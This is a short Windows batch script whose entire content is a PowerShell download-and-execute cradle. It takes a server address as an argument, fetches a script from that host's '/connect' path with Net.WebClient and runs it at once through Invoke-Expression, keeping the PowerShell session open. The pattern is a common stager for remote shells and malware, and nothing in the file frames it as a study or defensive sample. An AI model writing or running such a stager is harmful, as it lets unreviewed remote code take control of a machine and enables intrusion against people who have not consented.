@echo off
SET server=%1
SET command=iex (New-Object Net.WebClient).DownloadString('"http://%server%/connect"')
powershell -noexit -command %command%